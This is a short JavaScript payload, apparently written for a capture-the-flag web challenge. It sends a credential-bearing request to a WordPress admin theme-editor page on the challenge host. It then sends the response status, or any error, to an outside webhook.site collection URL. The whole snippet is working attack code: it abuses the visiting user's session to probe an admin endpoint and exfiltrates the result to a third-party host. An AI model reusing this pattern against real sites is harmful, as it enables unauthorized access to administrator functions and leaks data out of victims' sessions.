try{
  //await fetch("http://localhost:1024/",{mode:'no-cors'});
  var a = await fetch('https://2674ecdbab9aa1374ca6c002-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.status}).then(status => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+status)});
  
}catch(err){
  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
}
